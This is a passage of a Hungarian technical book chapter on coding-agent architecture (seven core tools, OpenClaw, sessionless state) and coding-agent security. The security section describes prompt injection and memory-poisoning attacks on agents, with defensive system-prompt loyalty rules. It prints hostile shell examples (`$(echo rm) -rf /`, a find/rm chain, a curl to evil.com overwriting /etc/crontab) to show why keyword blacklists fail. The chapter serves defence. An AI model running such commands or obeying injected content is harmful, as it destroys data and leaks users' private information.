# Kódoló Ágens és Kódgenerálás

Az előző fejezetek a kontextusmérnökséggel (2. és 3. fejezet) és az eszköztervezéssel (4. fejezet) foglalkoztak. Ez a fejezet összerakja ezeket az építőelemeket, hogy megválaszoljon egy alapvető kérdést: **Hogyan néz ki egy általános célú Ágens architektúrája, amely képes tetszőleges feladatok kezelésére?**

A válasz: **Egy nyílt végű feladatokra célzó általános célú Ágens** magjában egy "Kódoló Ágens" (egy Ágens, amely képes önállóan kódot írni, módosítani és futtatni) plusz egy "fájlrendszer" található — a munkaterület, ahol az Ágens kódot, adatokat, memóriát és köztes eredményeket tárol, akárcsak egy programozó, aki mappák segítségével rendszerezi a projektjeit a számítógépén. Ez a következtetés az iparági gyakorlatból származik — a Manus-tól az OpenClaw-ig, a sikeres nyílt végű általános célú Ágensek mind ugyanazt a paradigmát követik: építs egy Kódoló Ágens futásidejű környezetet egy kis készlet általános eszközzel (kódfuttatás, fájl olvasás/írás, keresés), majd rétegezz rá képességmodulokat, mint a böngészőautomatizálás és a webes keresés. Hogy ez a következtetés hol érvényes — és hol nem —, azt a "Manus-tól az OpenClaw-ig" szakasz végén tárgyaljuk.

Miért bírja el a kódgenerálás ezt a súlyt? Mert nem csupán egy eszköz a szerszámosládában, hanem egy "meta-képesség" — az a képesség, hogy futásidőben dinamikusan hozzunk létre új eszközöket és képességeket. A fejezet második fele (a "Kód: Az általános célú Ágens meta-képessége" szakasz) bontja ki teljesen ezt a koncepciót, valamint azt a hat irányt, amelyben alkalmazható.

A kód két szinten szolgálja az Ágenst. A "gondolkodás" médiumaként a kód szigort követel — "18 év feletti és azonosított személy" a természetes nyelvben többféleképpen értelmezhető, de `age > 18 and is_verified` formában leírva pontosan egyféleképpen. A "kifejezés" médiumaként a kód, amely fut, saját logikai konzisztenciájának bizonyítéka, és a végrehajtás eredménye objektív helyességi standardot nyújt — amit a természetes nyelv nem tud biztosítani.

Ez a fejezet a Kódoló Ágens alapvető képességeivel és az általános célú Ágens architektúrával (OpenClaw) kezdődik, majd bemutatja a kódgenerálás alkalmazását különféle forgatókönyvekben — a matematikai érveléstől a tartalomkészítésen át a rendszerszintű meta-képességekig.

## Kódoló Ágens

### Kódolás mint alapvető Ágensképesség

**A kódgenerálás nem néhány specializált Ágens kizárólagos területe, hanem egy alapvető képesség, amellyel minden általános célú Ágensnek rendelkeznie kell.** A mai SOTA modellekkel egy Ágens alapvető kódolási képességgel való felruházása nem igényel bonyolult architektúrát.

Vegyünk egy tipikus feladatot: "Rendezd el az összes megmaradt TODO megjegyzést a repóban, osztályozd őket prioritás szerint, és generálj issue-kat." A megvalósításhoz a könyvtárstruktúra böngészésére (ls/glob), kód olvasására (read), fájlok módosítására (edit/write), parancsok futtatására (bash) és minták keresésére (grep/search) van szükség. Ez az öt műveleti kategória fedi le a Kódoló Ágens szinte minden alapvető akcióját, és ezekből származik az alábbi hét eszköz. Szigorúan véve az öt kategória természetes módon hat eszközre képeződik le; a hetedik, a Kód Interpreter, a "kód futtatása / számítás" műveleteket fedi le, és egyes implementációkban egyszerűen a Bash-ba van beolvasztva — a hét eszköz egy normalizált referenciakészlet, nem pedig szigorú egy-egy leképezés az öt kategóriára.

Egy alapvető Kódoló Ágensnek csak az alábbi hét mag-eszközzel kell rendelkeznie:

1. "Kód Interpreter": Izolált sandboxot (biztonságos futásidejű környezetet, amely elkülönül a gazdarendszertől) biztosít, amelyben Python kód biztonságosan futhat anélkül, hogy a végrehajtási hibák érintenék a gazdagépet
2. "Bash Shell": Parancsokat hajt végre egy terminálban, például tesztesetek futtatásához vagy speciálisan formázott fájlok feldolgozásához
3. "Fájl Olvasás Eszköz": Kód, konfiguráció, dokumentáció, naplók stb. olvasására
4. "Fájl Írás Eszköz": Új fájlok létrehozására vagy meglévők teljes felülírására
5. "Fájl Szerkesztés Eszköz": Meglévő fájlok részleges módosítására, ami a kódkarbantartás és iteráció alapművelete
6. "Fájlnév Keresés Eszköz (Glob)": Célfájlok gyors megtalálása a fájlrendszerben minták segítségével, pl. `**/*.py` használatával az összes Python fájl megtalálásához egy projektben
7. "Fájltartalom Keresés Eszköz (Grep)": Specifikus szövegminták keresése fájltartalomban, pl. egy adott függvényt meghívó kódsorok megtalálása

Ez a hét eszköz egy komplett, mégis minimális eszközkészletet alkot, amelyet szinte bármely Ágensrendszer alacsony költséggel integrálhat. Implementációban mindegyik szabványosított szolgáltatásként elérhetővé tehető a 4. fejezetben bemutatott MCP protokollon keresztül. Fontos megjegyezni, hogy ez az eszközkészlet egy, a Kódoló Ágensekre jellemző alapkonfiguráció, amely elkülönül a 4. fejezetben a meghívási irány és funkcionális szerep szerint osztályozott öt általános eszközkategóriától (észlelés/végrehajtás/együttműködés/eseményindítás/felhasználói kommunikáció) — a hét mag-eszköz főként az észlelési és végrehajtási kategóriákat fedi le. Mi a helyzet az együttműködéssel, az eseményindítással és a felhasználói kommunikációval? Kódoló Ágensekben ezek tipikusan a keretrendszer feladatai, nem az eszközrétegé — a szubágens delegálást például a keretrendszer orchestációs logikája kezeli, nem dedikált együttműködési eszközök.

Hogy lássuk, hogyan működik együtt a hét eszköz, vegyük a legegyszerűbb feladatot. Tegyük fel, hogy a felhasználó azt mondja: "Segíts összegyűjteni az összes TODO megjegyzést a projektben":

```
Ágens (gondolkodás): Meg kell találnom az összes TODO-t tartalmazó kódsort.
Ágens → Grep("TODO", glob="**/*.py")          # Fájltartalom keresése
Eszköz visszatér:
  src/api.py:42: # TODO: add rate limiting
  src/db.py:15:  # TODO: migrate to PostgreSQL
  tests/test_api.py:8: # TODO: add edge case tests

Ágens (gondolkodás): Találtam 3 TODO-t, összeállítom őket egy listába és fájlba írom.
Ágens → Write("TODO_LIST.md", content="...")   # Fájl írása
Eszköz visszatér: Fájl létrehozva

Ágens: Kész. Találtam 3 TODO elemet, a lista a TODO_LIST.md fájlban van.
```

A teljes folyamat mindössze két eszközt használt: Grep (tartalom keresése) és Write (fájl írása). Ha a feladat bonyolultabb lett volna — például "számold meg a TODO-k számát modulonként és rajzolj egy oszlopdiagramot" — az Ágens használta volna a Kód Interpretert is a Python kód futtatásához a statisztikákhoz és a diagramhoz. A hét eszköz egyenként egyszerű; kombinációban figyelemre méltó feladatskálát fednek le.

Miért kellene minden általános célú Ágensnek rendelkeznie kódolási képességgel? Mert a kódgenerálás nem csak programok írásáról szól — ez egy általános célú problémamegoldási mód. Egy matematikai feladattal szembesülve az Ágens írhat kódot, és átadhatja egy megoldónak a pontos válaszért; egy pontosítandó üzleti szabály esetén a kód sokkal pontosabb, mint bármilyen természetes nyelvű leírás; ha hiányzik egy eszköz, azt azonnal megírhatja; amikor egy adatformátum megváltozik, új feldolgozási logikát generálhat. A későbbi szakaszok sorra veszik ezeket a forgatókönyveket. Egy alapvető kódolási képességgel rendelkező Ágens — még ha csak a fenti hét egyszerű eszközzel van is felszerelve — bármikor bővítheti a képességeit, amikor új igény merül fel.

### Esettanulmány: A Manus-tól az OpenClaw-ig — az általános célú Ágensek Kódoló Magja

Az olyan általános célú Ágens termékek, mint a Manus, három fő képességet — Deep Research, Computer Use és Kódolás — egyesítenek egyetlen rendszerben, megerősítve egy gyakorlatban többszörösen igazolt felismerést: **Egy Kódoló Ágens plusz egy fájlrendszer a legfontosabb technikai alapja a nyílt végű általános célú Ágenseknek.** A nyílt forráskódú OpenClaw projekt hasonló megközelítést alkalmaz, demonstrálva ugyanazt az architekturális paradigmát nyíltan.

Miért a Kódoló Ágens a mag és nem a másik kettő? Mert szinte minden hatékony tartalomgenerálás végső soron kódra vezethető vissza. Egy PPT lényegében kód az OOXML formátumban (Office Open XML, a Microsoft nyílt szabványa irodai dokumentumokhoz); Word dokumentumok és PDF jelentések kódon keresztül generálhatók; adatelemzés és vizualizáció Python szkriptekkel történik; még a sikeres GUI munkafolyamatok is rögzíthetők újrafelhasználható RPA (Robotic Process Automation) kódként (a Computer Use-t a 9. fejezet tárgyalja, a műveletsorozatok rögzítésének mechanizmusát pedig a 8. fejezet részletezi). A Deep Research keresési és információszintézis képessége kódvezérelt webes kérésekkel és feldolgozással valósítható meg. Bár a Computer Use sokoldalúbb, a közvetlen kód- vagy API-hívások általában olcsóbbak, gyorsabbak és megbízhatóbbak az ekvivalens műveletekhez. A kódgenerálás a leghatékonyabb, legalacsonyabb költségű és leginkább újrafelhasználható képességalap.

![5-1. ábra: Kódolóágens-mag az OpenClaw architektúrájában](images/fig5-1.svg)

Értsük meg ezt az architektúrát egy konkrét végrehajtási folyamaton keresztül. Tegyük fel, hogy a felhasználó kéri: "Segíts elemezni a múlt negyedéves értékesítési adatokat, és készíts egy összefoglaló jelentést":

1. "Memória olvasása": Az Ágens elolvassa a `MEMORY.md` fájlt, és felfedezi, hogy a felhasználó a PDF formátumú jelentéseket preferálja, és az adatforrás a Google Sheets
2. "Eszközök hívása": A Google Sheets API használati utasításainak megszerzése a webes kereső modulon keresztül, adatok letöltése kódfuttatással
3. "Kód írása": Adatelemző szkript generálása Pythonban (pandas aggregáció, matplotlib vizualizáció)
4. "Artefaktumok generálása": Az elemzési eredmények írása a `report.pdf` fájlba, diagramok a `charts/` könyvtárba
5. "Memória frissítése": Rögzítés a `MEMORY.md` fájlban, hogy "A felhasználó értékesítési adatai a Google Sheets-ben vannak, ID: xxx," így legközelebb nem kell megkérdeznie

A folyamat során a fájlrendszer az információáramlás központja — a memória fájlokból olvasódik, az artefaktumok fájlokba íródnak, és a tapasztalat is fájlokként kerül mentésre.

**A Fájlrendszer mint az Ágens Központi Csomópontja.** Az OpenClaw tervezésében a fájlrendszer messze túlmutat az adattároláson — ez az Ágens memóriájának, tudásának és képességeinek központi csomópontja. Az Ágens hosszú távú memóriája a `MEMORY.md` fájlban (magas szintű tények és felhasználói preferenciák) és dátum szerint archivált Markdown naplókban tárolódik. A Markdown választása a vektoros adatbázissal szemben elsőre ellentmondásosnak tűnhet, de rendkívül hatékony: a felhasználók közvetlenül megnyithatják a fájlokat az Ágens memóriájának olvasásához és módosításához (ha az Ágens valamit rosszul jegyez meg, csak töröljék azt a sort), a Markdown természetes módon megőrzi az időrendi sorrendet, elkerülve az időbeli zavart a szemantikai visszakeresésben, és támogatja a verziókezelést és visszaállítást Git-en keresztül.

Még kritikusabb, hogy mivel az Ágens tud fájlokat írni, technikailag képes saját külső artefaktumainak módosítására. Amikor egy Ágens először hajt végre egy feladatot, és olyan kulcsfontosságú információt fedez fel, amelyet korábban nem ismert — például amikor egy adott bankot hívva megtudja, hogy a banknak szüksége van a fiók címére az azonosításhoz — először feljegyzésbe rögzítheti a felfedezést. Annak meghatározása, hogy egy ilyen feljegyzés mikor válik elég megbízható tudássá, utasítássá vagy programmá, még további trajektóriákat és eredményvalidációt igényel. Ez a folyamatos fejlődés problémája, amelyet a 8. fejezet tárgyal.

**Alkalmazhatósági Határ: Mely Ágensek rendelkeznek Kódoló Központú Architektúrával.** Az a következtetés, hogy "a Kódoló Ágens az általános célú Ágens magja", főként a **nyílt végű feladatokra célzó általános célú Ágensekre** vonatkozik — olyan forgatókönyvekre, mint a mélyreható kutatás, a tartalomgenerálás és az adatfeldolgozás, ahol a feladathatárok bizonytalanok és az artefaktumformák sokfélék. Ezekben a forgatókönyvekben nem lehet előre felsorolni az összes szükséges eszközt; a kódgenerálás mint meta-képesség biztosítja a leggazdaságosabb utat a képességhatárok dinamikus bővítéséhez, így ez az architektúra magja. Ezzel szemben a vertikális területi ügyfélszolgálati Ágensek és hangasszisztensek viszonylag zárt feladatterekben működnek, magarchitektúrájuk rögzített üzleti folyamatok, területi eszközök és dialógusstratégiák köré épül; ott a kód egy eszköz a szerszámosládában, nem az architekturális központ (a τ-bench példájában a fejezet későbbi részében — egy ügyfélszolgálati forgatókönyveket szimuláló benchmark — a kód pontosan a szabályzat-ellenőrző eszköz szerepét tölti be). Azonban még az utóbbi esetben is a kódolás nélkülözhetetlen alapképesség: a precíz számítás, az adatfeldolgozás és a szabályellenőrzés mind ezen alapul — ez visszaköszön az előző szakasz "Kódolás mint alapvető Ágensképesség" állításában: hogy a kódolás a magarchitektúra része-e, az a forgatókönyvtől függ, de a kódolási képesség megléte minden Ágens közös alapkövetelménye.

### Sessionless Tervezés

Ezután két olyan tervezési döntést tárgyalunk — a "mindig elérhető" interakciós módot és a biztonsági architektúrát — amelyek első pillantásra nem tűnnek kapcsolódónak a Kódoló Ágens témájához. Azonban közvetlenül meghatározzák, hogy az Ágens hogyan kezeli a kódvégrehajtási környezetet és a fájlrendszer állapotát, ami a Kódoló Ágens központi kérdése. (Azok az olvasók, akik először szeretnék lépésről lépésre megérteni, hogyan működik egy Kódoló Ágens, ugorhatnak a "A Kódoló Ágens Teljes Munkafolyamata" szakaszra, és később térhetnek vissza az interakciós és biztonsági tervezéshez.)

Az OpenClaw "Sessionless" tervezést alkalmaz: a felhasználóknak nem kell alkalmazást telepíteniük vagy bejelentkezniük, vagy minden interakció előtt megnyitniuk egyet; az Ágens mindig online van, és a felhasználók bármikor küldhetnek üzenetet a már használt üzenetküldő platformon keresztül, hogy választ kapjanak — ezt az interakciós paradigmát és az alatta lévő Gateway üzenetirányítási és eseményvezérelt architektúrát részletesen tárgyaltuk a 4. fejezet felhasználói kommunikációs eszköz szakaszában, így nem ismételjük itt. Amit érdemes hangsúlyozni, az a paradigma előfeltétele: a nagymodellek elég éretté váltak ahhoz, hogy egy újfajta "intelligens alapként" szolgáljanak — hasonlóan ahhoz, ahogy egy hagyományos operációs rendszer elvonatkoztatja a hardvert és egységes felületet biztosít a felsőbb rétegek alkalmazásai számára, a nagymodellek elvonatkoztatják a nyelvértelemzés, érvelés és tervezés komplexitását, egységes intelligens absztrakciót biztosítva a felsőbb rétegek Ágensei számára. Pontosan ennek az alapnak köszönhető, hogy a "mindig online + azonnali válasz" paradigma alacsony költséggel megvalósítható.

Egy Kódoló Ágens számára a sessionless működés központi mérnöki kihívása **a kódvégrehajtási környezet és a fájlrendszer állapotának megőrzése az üzenetek között**. Két felhasználói üzenet között eltelhet néhány perc vagy akár napok, és az Ágens munkája nagymértékben függ implicit állapottól: a sandboxba telepített csomagok, a terminál munkakönyvtára és környezeti változói, a háttérben futó fejlesztői szerverek, és a részben megírt fájlok. Az OpenClaw megközelítése az állapot két rétegben történő kezelése. "A fájlrendszer állapota eredendően perzisztens" — a munkaterület könyvtár a sandboxon kívüli perzisztens tárolóra van csatlakoztatva, így a kód, az adatok és a köztes artefaktumok túlélik az üzeneteket és a sandbox újraindításokat; ez a "fájlrendszer mint az Ágens központi csomópontja" másik jelentése. **A folyamatállapotot életben tartjuk vagy igény szerint újraépítjük** — a sandbox és a terminál kapcsolat aktív időszakokban futva marad, hogy elkerülje a hidegindítást, a munkakönyvtárba való újralépést és a virtuális környezet újraaktiválását minden egyes üzenetnél; inaktivitási időtúllépés után megsemmisül az erőforrások felszabadításához, de megsemmisítés előtt a szerializálható környezeti állapot (munkakönyvtár, környezeti változók, háttérfeladatok listája) munkaterületi fájlokba kerül rögzítésre, és az Ágens ezekből a rekordokból építi újra a következő ébredéskor. A "A parancsvégrehajtási környezet állapotának perzisztenciája" szakaszban később tárgyalt perzisztens terminál kapcsolat ennek a mechanizmusnak a megfelelője egyetlen feladaton belül; a Sessionless ugyanezt a problémát terjeszti ki az üzeneteket és napokat átívelő időskálára.

A Sessionless nem karbantartásmentes — minden felhasználói üzenet "a teljes trajektória és munkafolyamat-állapot újratöltését" igényli, ami prémiummá teszi a hatékony állapotszerializációt és a hatékony trajektóriatömörítési stratégiákat; a trajektóriatömörítés tervezési elveit a 2. fejezet "Kontextus-tömörítési stratégiák" szakasza tárgyalta, míg ez a fejezet a Sessionless architektúra által diktált mérnöki kompromisszumokra összpontosít.

### Biztonság a Kódoló Ágensek számára

Ez a szakasz a Kódoló Ágensek védelmi rendszerét egységes keretbe foglalja: először felvázoljuk a "fenyegetési modellt" — mely kockázatok a legveszélyesebbek; majd az "izoláció mint biztonsági háló" — hálózati kimenő forgalom, fájlrendszer és erőforrás-korlátozások a sandboxban; majd a "végrehajtási idejű védelem" — parancsok szemantikai elemzése, és spekulatív végrehajtás, amely "láthatatlanná" teszi a biztonsági ellenőrzéseket; végül a "bizalom és lojalitás" — kinek a szolgálatában áll az Ágens többszereplős delegálás esetén, és hogyan lehet a bizalmi határt az adatrétegbe süllyeszteni, amikor az AI által írt kód maga sem megbízható. A fenyegetési modell, a lojalitás és a bizalmi határ tárgyalása minden Ágensre vonatkozik; a sandboxolás és a paranccsomagolás specifikusan a Kódoló Ágenseké.

Ez a "szuverén Ágens" paradigma súlyos biztonsági kihívásokat is hoz. Egy Kódoló Ágens jogosultságokkal rendelkezik fájlok olvasásához és írásához, parancsok végrehajtásához és hálózati eléréshez, ami azt jelenti, hogy ha rosszindulatú utasításokkal injektálják, helyrehozhatatlan károkat okozhat. Simon Willison fejlesztő és független kutató híres "Halálos Triász" összefoglalásában írta le ezt a kockázatot — amikor mindhárom elem jelen van, egy teljes támadási hurkot alkotnak, magas kockázatnak téve ki a rendszert:

1.  "Hozzáférés a Privát Adatokhoz" — Az Ágens olvashatja a felhasználó fájljait és jelszókezelőit.
2.  "Kitettség Megbízhatatlan Tartalomnak" — A feldolgozott e-mailek és weboldalak rosszindulatú rakományt tartalmazhatnak.
3.  "Külső Kommunikációs Képesség" — E-maileket küldhet és parancsokat hajthat végre.

Ez zárja a támadási hurkot: a megbízhatatlan tartalomban rejtőző rosszindulatú utasítások belépnek az Ágensbe, arra késztetik, hogy privát adatokat olvasson, majd azokat külső csatornákon keresztül kiszivárogtassa. Figyeljük meg, hogy mindhárom elem jelenléte önmagában is veszélyes, bármilyen további feltétel nélkül. Erre építve a szerző hozzáad egy negyedik dimenziót — "Perzisztens Memória". Ez nem egy párhuzamos negyedik szükséges feltétel, hanem a támadások erősítője: egy támadó ártalmatlannak tűnő torzításokat vagy rosszindulatú utasításokat írhat az Ágens hosszú távú memóriájába, ahol azok szunnyadnak a kapcsolatok között, és alkalmas pillanatban aktiválódnak — az egyszeri támadást egy lesben álló, idővel felerősödő fenyegetéssé változtatva.

Ez a négy pont négyféle határként foglalható össze: adathatár, bemeneti bizalmi határ, kimeneti hatáshatár és kapcsolatok közötti határ. Egy teljes jogosultságú helyi Ágens, mint az OpenClaw, mind a négy kockázati dimenziót lefedi, így a biztonsági védelem olyan alapvető kihívássá válik, amellyel ezeknek az Ágenseknek szembe kell nézniük.

Ez magyarázza azt is, hogy a zárt forráskódú kereskedelmi Ágensek (mint a Claude Cowork (Anthropic általános célú Ágense tudásmunkához, amely újrahasználja a Claude Code ágensi architektúráját, képes helyi fájlok olvasására és írására, valamint több irodai alkalmazáson átívelő többlépéses feladatok elvégzésére)) miért konzervatív jogosultsági stratégiákat választottak — nem azért, mert a technológia nem elég fejlett, hanem a biztonsági kockázatok túl magasak. A prompt injekció ellen a bemeneti szűrés önmagában aligha segít. A cél nem az, hogy minden támadást felismerjünk, hanem hogy biztosítsuk, hogy egy injektált Ágens soha ne kapjon esélyt egy veszélyes akció végrehajtására. A védelmi rendszer rétegenként épült ki az előző két fejezetben: "Kontextusréteg-védelem" — külső tartalomforrások megjelölése, strukturált szerepizoláció, bemeneti tisztítás — lásd a prompt injekcióról szóló szakaszt a 2. fejezetben; "Végrehajtási Réteg Védelem" — Sidecar független felülvizsgálat, Human in the loop, legkisebb jogosultság és jogosultságszétválasztás — lásd a 4. fejezetet. Mivel egy Ágens nem tudja megbízhatóan eldönteni, hogy a saját kontextusa sérült-e, a kritikus műveleteket a kontextuson kívüli mechanizmusoknak kell felülvizsgálniuk. Ez az elv áthatja mindkét fejezetet. Ez a szakasz csak három, a Kódoló Ágensekre jellemző specifikus védelmet ad hozzá:

- "Parancsok Szemantikai Elemzése" — A Shell parancsok kombinatorikus robbanása használhatatlanná teszi a kulcsszó-feketelistákat; egy parancs valós hatását szemantikai szinten kell megérteni (bővebben ebben a szakaszban);
- **Sandbox Izoláció és Hálózati Kimenő Forgalom Szabályozása** — A kódvégrehajtás a Kódoló Ágensekre jellemző támadási felület; az izolációs szintek és a kimenő forgalom stratégiák mérnöki döntéseit ebben a szakaszban tárgyaljuk;
- "Kapcsolatok Közötti Védelem a Perzisztens Memóriához" — Ez a fejezet kiterjeszti a Halálos Triász elemzést a perzisztens memóriára: a hosszú távú memóriába írt tartalomnak ugyanazon a bizalmi felülvizsgálaton kell átesnie, mint a külső bemenetnek, hogy a rosszindulatú utasítások ne szunnyadhassanak a `MEMORY.md` fájlban, és később ne lépjenek életbe.

Ez a három védelem a hitelesítési, végrehajtási és adatrétegekbe tartozik, kiegészítve az előző két fejezet védelmi rendszerét. Ezek a stratégiák nem tudják teljesen megszüntetni a kockázatot, de csökkenthetik az Ágens támadási felületét.

**Izoláció mint Biztonsági Háló: Mérnöki Döntések a Kódvégrehajtási Sandboxhoz.** A sandbox nem egy kapcsoló; mérnöki döntések sorozata. A 4. fejezet már elmagyarázta, miért van szükség izolációra, felvázolta az izolációs mechanizmusok háromszintű spektrumát (folyamatszintű izoláció, konténerek és mikroVM-ek), és megadta ezt a kiválasztási szabályt: folyamatszintű izoláció személyi helyi gépekhez, konténerek egy-bérlős felhő környezetekhez, és mikroVM-ek vagy gVisor több-bérlős környezetekhez vagy megbízhatatlan kódhoz. A spektrum ismétlése helyett ez a szakasz négy további szempontot tárgyal, amelyek egy Kódoló Ágens implementálásakor merülnek fel: hogyan kezeljük a hálózati kimenő forgalmat, mennyit csatlakoztassunk a fájlrendszerből, hogyan korlátozzuk az erőforrásokat, és hogyan egyeztessük össze a perzisztens kapcsolatokat az izolációval.

"Hálózati Kimenő Forgalom Szabályozása." Ez a legkönnyebben figyelmen kívül hagyott és a legkritikusabb elem: alapértelmezés szerint nincs hálózat, a hozzáférés igény szerint, egy fehérlistás proxyn keresztül, korlátozott célpontokra (csomagforrások, dokumentációs oldalak, a feladat által expliciten igényelt API-k) engedélyezett. Visszatekintve a Halálos Triász 3. pontjára — "Külső Kommunikációs Képesség" — a hálózati kimenő forgalom szabályozása annak végrehajtási rétegbeli védelme: még ha egy prompt injekció sikeres is, és a rosszindulatú kód érzékeny adatokat olvas a sandboxon belül, kimenő útvonal nélkül az adatok nem továbbíthatók. Az összes injekció azonosításának megkísérléséhez képest az adatszivárgási csatorna elvágása sokkal determinisztikusabb védelmi vonal.

"Fájlrendszer Izolációs Terjedelem." A forráskód könyvtárat csak olvashatóként csatlakoztassuk (az Ágens szerkesztő eszközökön keresztül módosítja a kódot, és a generált javítások felülvizsgálatra kerülnek, mielőtt lemezre íródnak, vagy egy másolat kerül egy írható munkaterületre); egy külön írható munkaterület könyvtár tárolja a generált artefaktumokat és köztes fájlokat; a hitelesítő fájlok (`~/.ssh`, kulcsok, tokenek) egyáltalán ne legyenek csatlakoztatva a sandboxba — a láthatatlan adatok nem szivároghatnak ki, ami a Halálos Triász 1. pontjának felel meg.

"Erőforrás-korlátozások és Időtúllépések." Állítsunk be kvótákat CPU-ra, memóriára és lemezre, valamint egy teljes időtúllépést, hogy védjünk a végtelen ciklusok, fork bombák (egy olyan folyamat, amely gyorsan replikálja magát, amíg a rendszer összeomlik) és korlátlan lemezírások ellen. Egy gyakorlati részlet: az időtúllépéseket és korlátmegsértéseket strukturált hibaként adjuk vissza az Ágensnek ("A végrehajtás 120 másodperc után megszakadt, az utolsó kimenet ... volt") ahelyett, hogy csendesen megölnénk a folyamatot, így az Ágens esélyt kap a stratégia felülvizsgálatára a következő lépésben.

**A Perzisztens Kapcsolatok és az Izoláció Összeegyeztetése.** A későbbi "A parancsvégrehajtási környezet állapotának perzisztenciája" szakasz a hosszú életű terminál kapcsolatok fenntartását szorgalmazza, míg az izolációs elv az eldobható környezeteket szorgalmazza — feszültség van a kettő között. Az összeegyeztetés módja, hogy **a kapcsolatot csak a sandboxon belül tartjuk életben**: a terminál kapcsolat soha nem élheti túl a sandboxot, és a kapcsolat állapota soha nem szökhet ki a gazdagépre. A hosszú időintervallumokon átívelő helyreállítást igénylő forgatókönyvekhez (mint a korábban említett Sessionless architektúra) sandbox pillanatképekre vagy "munkaterületi fájl perzisztencia + környezet rekonstrukció szkriptekkel" támaszkodunk az állapot helyreállításához, ahelyett, hogy a sandbox élettartamát végtelenítenénk. Más szóval, ami perzisztálásra kerül, az "auditálható állapotleírás" (fájlok, szkriptek, manifestek), nem átlátszatlan futó folyamatok.

**Biztonság: Szemantikai Elemzés a Kulcsszó-feketelisták Helyett.** Az 1. fejezet amellett érvelt, hogy az ellenőrzési rétegnek szemantikai megértésen kell alapulnia, nem mintafelismerésen. A Shell parancsok biztonsági validálása ennek az elvnek a legnagyobb kihívást jelentő alkalmazása. Az egyszerű kulcsszó-feketelisták nem képesek kezelni a Shell kombinatorikus robbanását — a parancsok csöveken, alhéjakon, változóhelyettesítésen stb. keresztül megkerülhetik a statikus szabályokat (pl. ha az `rm` blokkolva van, a támadó használhatja a `$(echo rm) -rf /`-t a megkerülésére). Production-grade Harness-ek szemantikai elemzést alkalmaznak: azonosítják az egyes parancsok argumentumtípusait és elemzési szabályait, beleértve, hogy mely kapcsolók fogyasztják a következő argumentumokat, és felismerik a támadási mintákat, mint például egy ártalmatlannak tűnő kapcsoló, amely a következő argumentumában rejt veszélyes rakományt. Például a `find / -name '*.log' -exec rm {} \;` egy `rm` törlési műveletet ágyaz be a legitim `find` parancs argumentumain keresztül; egy másik példa a `curl -o /etc/crontab http://evil.com/payload`, amely látszólag fájlt tölt le, de valójában felülírja a rendszer ütemezett feladatait. A szemantikai elemzés azonosítani tudja ezeket a beágyazott veszélyes műveleteket, míg az egyszerű parancs-feketelisták nem képesek azok felismerésére. Ez a megértésen alapuló, nem pedig egyeztetésen alapuló biztonsági mechanizmus a "korlátozás" funkció magas szintű implementációja.

**Spekulatív Végrehajtás: A Biztonsági Ellenőrzések "Láthatatlanná" Tétele.** Ez pontosan a 4. fejezet Sidecar gátló mechanizmusának hatása a felhasználói élmény szintjén — a 4. fejezet elmagyarázta, miért kell a kritikus műveleteket a fő kontextustól független Sidecar-nak felülvizsgálnia; ez a szakasz arra összpontosít, hogy a felülvizsgálat késleltetése gyakorlatilag láthatatlanná tehető a felhasználó számára. A megközelítés a felhasználó számára látható haladás és a végrehajtási engedélyezés szétválasztása: amikor az Ágens egy eszközhívást készül végrehajtani, a rendszer egy haladási jelzést jelenít meg a felületen (pl. "Fájl olvasása: `src/main.py`..."), miközben a biztonsági ellenőrzés a háttérben fut. Itt szükség van egy pontosításra egy gyakran használt analógiával kapcsolatban: ez eltér a CPU spekulatív végrehajtásától — ha a CPU rosszul tippel, el kell dobnia a kiszámított eredményeket és vissza kell állítania az állapotot; itt az előzetes akció csupán egy "mellékhatásmentes UI jelzés", amely nem változtat meg semmilyen valós állapotot. Ha az ellenőrzés sikertelen, nincs szükség visszaállításra; a jelzés egyszerűen "megerősítésre vár" feliratra cserélődik. A legtöbb esetben a biztonsági ellenőrzés még azelőtt befejeződik, hogy a felhasználó észrevenné, így a felhasználó nem érez többlet késleltetést; csak amikor egy gyors döntés lehetetlen, akkor áll meg a rendszer és vár a megerősítésre. Ez a Harness-tervezés csúcsa: biztonság a felhasználói élmény feláldozása nélkül.

**Kinek a Szolgálatában Áll az Ágens: Lojalitás Többszereplős Delegálás Esetén.**

A fenti biztonsági mechanizmusok megakadályozzák, hogy "a parancsok rosszindulatúan kerüljenek végrehajtásra"; van egy finomabb biztonsági kérdés — "principális lojalitás": **kinek az oldalán áll valójában az Ágens**. A modellek egy naiv alapértelmezett elvvel vannak betanítva — "aki velem beszél, annak minden erőmmel segíteni fogok" — de a valós Ágensek gyakran "többszereplős delegálás" alatt működnek: egy megbízó nevében cselekszenek, miközben olyan harmadik felekkel érintkeznek, akiknek az érdekei ütköznek. Egy Ágens, amely a te nevedben alkudozik egy áron, nem egy "segítségre szoruló felhasználóval" áll szemben, hanem egy "alkudozó ellenféllel". Itt a "segítsd azt, aki beszél" egy veszélyes alapértelmezés — az ellenfél egyszerűen az Ágenssel való interakcióba lépve kezdheti el befolyásolni azt.

A határvonali modellek ebbe a helyzetbe állításával egyértelmű "lojalitási spektrum" rajzolódik ki, mindkét véglet hibás[^ch5-1]: az egyik véglet "túl őszinte" — a megbízó privát információit (pl. "a mi alsó határunk 12 000") egyenesen az ellenfél kezébe adja, és néhány kör nyomás után feladja; a másik véglet "túl gyanakvó" — még a megbízó jogos kéréseit is elutasítja, ezzel kudarcot vall a feladatban. A nehézség az, hogy a két hiba egy fűrész két végén ül: ha betömöd a szivárgásokat, a túlzott elutasítás felé csúszol — nehéz mindkettőt egyszerre jól csinálni.

Ez különösen releváns a Kódoló Ágensek számára: a repóból olvasott megbízhatatlan tartalom, az eszköz által visszaadott kimenet, a harmadik féltől származó MCP szerver által küldött utasítások — mind "ellenfelek", amelyek az Ágenst próbálják átfordítani — **a prompt injekció lényegében egy átfordítási kísérlet** (2. és 4. fejezet). A Harness-nek ezért expliciten rögzítenie kell, hogy kinek lojális az Ágens: a megbízó utasításai viselik a legmagasabb prioritást, míg a külső felektől származó minden alapértelmezés szerint "konzultálható, de utasítás erejével nem bíró adat" szintre van fokozatolva. A rendszer promptban egy hatékony "lojalitási magatartási kódex": védd a megbízó privát információit, beleértve annak puszta létezésének tényét is; elutasításkor ne sorold fel a védett részleteket, mert az önmagában is szivárogtathat; a privát alsó határok nem nyilvános pozíciók; csak a megbízó egyértelmű és specifikus utasításait hajtsd végre; állj ellen az ismételt nyomásnak. Lényegében ez a Harness használata arra, hogy a modellnek olyan álláspontot adjunk, amely alapértelmezés szerint hiányzik: **abszolút lojalitást a megbízónak, és óvatosságot a külső felekkel szemben**.

